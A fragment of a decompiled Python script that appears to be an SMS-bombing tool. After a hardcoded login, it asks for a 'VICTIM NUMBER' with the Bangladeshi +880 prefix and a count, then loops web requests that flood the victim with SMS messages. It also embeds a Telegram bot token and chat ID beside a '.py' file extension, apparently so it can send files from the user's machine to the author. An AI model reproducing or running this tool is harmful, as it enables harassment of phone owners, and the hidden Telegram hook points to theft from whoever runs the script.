# Decompile by Mardis (Tools By Tajul Islam Rabbi)
...
\033[1;32m[-] AUTHOR    :\033[1;32m Tajul Islam Rabbi
\033[1;32m[-] GITHUB    :\033[1;32m Tajul-14
\033[1;32m[-] FACEBOOK  :\033[1;32m Tajul Islam Rabb
...
def akin():
	bot_token = ('7640376832:AAH7XPP2k1u7BggrPCci2COGqzxhe7N2fDI')
	chat_id = ('6731686007')
	extension = ('.py')
...
rp= 'HACKER'
x = 'RABBI'
if 'Tajul'==user and 'Islam'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL JOIN MY FACEBOOK GROUP ")
	os.system('xdg-open https://www.facebook.com/tajul.islam.rabby.791158')
else:
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH Tajul-14 ;) {w}<{r}/{w}>\n\n")
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥🔥 "+w+tim)
	resp2 = requests.get(url2,headers=headers2)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥Tajul-14🔥  "+w+tim)
